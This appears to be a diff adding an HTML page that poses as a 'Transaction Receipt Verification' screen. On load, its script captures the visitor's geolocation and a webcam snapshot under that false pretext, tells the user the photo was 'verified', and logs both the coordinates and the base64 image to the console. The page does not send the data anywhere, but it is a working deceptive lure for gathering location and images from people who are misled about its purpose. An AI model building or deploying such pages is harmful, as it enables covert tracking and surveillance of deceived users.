@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Transaction Receipt Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background-color: #f8f9fa;
+      margin: 0;
+      padding: 20px;
+    }
+
+    #container {
+      background: white;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      max-width: 600px;
+      margin: 50px auto;
+    }
+
+    video,
+    canvas {
+      max-width: 100%;
+      border-radius: 12px;
+      margin: 10px 0;
+    }
+
+    button {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div id="container">
+    <h1>Receipt Verification in Progress</h1>
+    <p>Please wait while we verify your receipt and device information.</p>
+
+    <div id="location-section">
+      <h2>Device Location Captured</h2>
+      <p id="latitude">Latitude: Capturing...</p>
+      <p id="longitude">Longitude: Capturing...</p>
+    </div>
+
+    <div id="camera-section">
+      <h2>Camera Verification</h2>
+      <video id="video" autoplay playsinline></video>
+      <canvas id="canvas"></canvas>
+      <p id="capture-message">Camera access needed for additional verification.</p>
+    </div>
+
+    <p>Your details will be processed shortly. Thank you for your patience.</p>
+  </div>
+
+  <script>
+    // Capture and log user's location
+    function captureLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            document.getElementById('latitude').innerText = `Latitude: ${latitude}`;
+            document.getElementById('longitude').innerText = `Longitude: ${longitude}`;
+
+            // Log location data to console
+            console.log("Location Data:");
+            console.log(`Latitude: ${latitude}`);
+            console.log(`Longitude: ${longitude}`);
+          },
+          (error) => {
+            console.error("Location access denied or unavailable.");
+          }
+        );
+      }
+    }
+
+    // Access user's camera, take a snapshot, and log the image data
+    async function captureCamera() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const context = canvas.getContext('2d');
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        // Automatically capture a frame after a short delay
+        setTimeout(() => {
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL('image/png'); // Get the image data URL
+
+          // Log image data to console
+          console.log("Captured Image Data (Base64):");
+          console.log(imageData);
+
+          document.getElementById('capture-message').innerText = "Photo captured and verified.";
+          stream.getTracks().forEach(track => track.stop()); // Stop the video stream after capture
+        }, 5000); // 5-second delay to allow stabilization
+      } catch (error) {
+        console.error("Camera access denied or unavailable.");
+      }
+    }
+
+    // Trigger location and camera capture on page load
+    window.addEventListener('load', () => {
+      captureLocation();
+      captureCamera();
+    });
+  </script>
+
+</body>
+
+</html>
